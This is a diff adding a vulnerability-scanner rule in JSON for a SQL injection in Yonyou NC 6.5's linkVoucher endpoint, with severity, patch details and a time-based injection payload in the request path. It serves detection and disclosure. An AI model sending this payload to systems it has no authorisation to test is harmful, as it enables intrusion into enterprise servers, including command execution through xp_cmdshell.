@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友NC linkVoucher SQL注入漏洞",
+    "level": "高危",
+    "description": "用友NC /portal/pt/yercommon/linkVoucher 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。",
+    "product": "用友NC",
+    "version": "用友NC65",
+    "cve": "",
+    "reference": "https://mp.weixin.qq.com/s/fD3digXVAIm9FySPVc5e_Q",
+    "fixing": "打对应补丁，重启服务，\nNC65方案\n补丁名称：\npatch_65_网报_凭证预览_linkVoucher_SQL注入漏洞修复\n补丁编码：\nNCM_NC6.5_000_109902_20240522_GP_352540737",
+    "rule": {
+        "path": "/portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'--",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "html",
+        "res_time": "5"
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
